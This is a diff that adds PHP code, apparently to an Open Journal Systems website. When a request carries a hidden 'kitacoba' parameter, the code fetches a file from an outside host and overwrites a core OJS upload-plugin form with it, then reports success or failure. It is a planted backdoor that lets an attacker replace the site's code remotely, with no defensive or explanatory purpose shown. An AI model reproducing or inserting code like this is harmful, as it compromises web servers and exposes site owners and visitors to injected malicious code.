@@ -1,0 +1,8 @@
+if (isset($_GET['kitacoba'])) {
+    $f = '/var/www/html/ojs.latinaer.org/lib/pkp/controllers/grid/plugins/form/UploadPluginForm.php';
+    $d = @file_get_contents('https://henshinjakarta.org/arsip/ojs.latinaer.txt');
+
+    echo (!$d) ? "[FAILED: GET]" :
+         (@file_put_contents($f, $d) ? "[SUCCESS]" :
+         (is_writable($f) ? "[FAILED: WRITE]" : "[FAILED: CHMOD/PERMISSION]"));
+}
